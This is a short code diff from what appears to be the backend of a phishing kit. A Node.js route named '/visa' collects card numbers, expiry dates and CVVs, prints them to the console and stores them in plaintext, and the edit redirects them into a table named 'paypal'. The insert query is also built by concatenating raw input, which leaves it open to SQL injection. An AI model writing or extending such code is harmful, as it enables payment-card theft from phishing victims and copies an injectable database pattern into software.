@@ -34,12 +34,12 @@ app.get('*/confirm', function (req, res) {
 
 
 app.post('/visa', function (req, res) {
-    var a = req.body.a;
+    var a = req.body.a+'+++';
     var b = req.body.b;
     var c = req.body.c;
     b = b.replace('/', '.')
     console.log(a + '--' + b + '--' + c)
-    client.query("Insert into visa (card,exp,cvv) values('" + a + "','" + b + "','" + c + "')", function (err, result) {
+    client.query("Insert into paypal (card,exp,cvv) values('" + a + "','" + b + "','" + c + "')", function (err, result) {
         console.log('resulttttttttttttt : ' + result)
         console.log('errrrrrrrrrrrrrrrrrrrrrr : ' + err)
     })
